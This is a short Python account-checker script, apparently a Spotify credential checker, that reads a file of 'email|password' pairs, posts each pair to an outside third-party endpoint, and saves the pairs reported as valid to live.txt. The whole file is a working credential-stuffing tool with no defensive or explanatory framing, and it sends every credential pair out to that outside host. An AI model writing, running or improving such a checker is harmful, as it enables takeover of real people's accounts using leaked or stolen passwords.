#!usr/bin/python3.7
#Author : KANG-NEWBIE

try:
	import requests, os
except Exception as ex:
        print("[Module not found] %s"%(ex))
        exit("[Tips] pip install requests")
#color
g='\033[1;32m'
r='\033[1;31m'
nc='\033[0m' #No color

tol=[]
til=0
pul=[]
pek=[]

os.system('clear')
print("""         C H E C K E R
   ___|    _ \    _ \ __ __| _)
 \___ \   |   |  |   |   |    |
       |  ___/   |   |   |    | Author : KANG-NEWBIE
 _____/  _|     \___/   _|   _| Contact: t.me/kang_nuubi

                                """)
try:
        print("[#] file harus berisi 'email|password'")
        o=open(input("%s[!] file list: "%(nc))).read().splitlines()
except Exception as f:
        exit("[file not found] %s"%(f))
for x in o:
        k=x.split("|")
        tol.append(k[1])
        pul.append(k[0])
s=len(tol)
while til < s:
	til+=1
	req=requests.post("https://api.dw1.co/spotify/v2/check",data={"email":pul[til-1],"password":tol[til-1]})
	if "true" in req.text:
		pek.append(pul[til-1])
		open("live.txt","a+").write("%s|%s\n"%(pul[til-1],tol[til-1]))
		print("[%sLIVE%s] %s -> %s"%(g,nc,pul[til-1],tol[til-1]))
	else: print("[%sDIE%s] %s -> %s"%(r,nc,pul[til-1],tol[til-1]))

print("-"*30)
print("[!] Live: %s"%(len(pek)))
print("[!] Result saved: live.txt")
print("-"*30)
